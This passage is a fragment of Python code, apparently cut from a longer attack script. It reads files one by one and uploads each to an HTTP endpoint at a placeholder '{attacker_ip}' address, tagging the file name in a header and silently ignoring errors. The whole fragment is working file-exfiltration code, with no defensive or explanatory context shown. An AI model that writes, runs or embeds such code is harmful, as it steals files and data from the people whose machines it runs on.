        data=open(f,'rb').read()
    except Exception:
        continue
    req=urllib.request.Request('http://{attacker_ip}:8000/upload',data=data,method='POST')
    req.add_header('X-File',f)
    try:
        urllib.request.urlopen(req,timeout=5).read()
    except Exception:
        pass
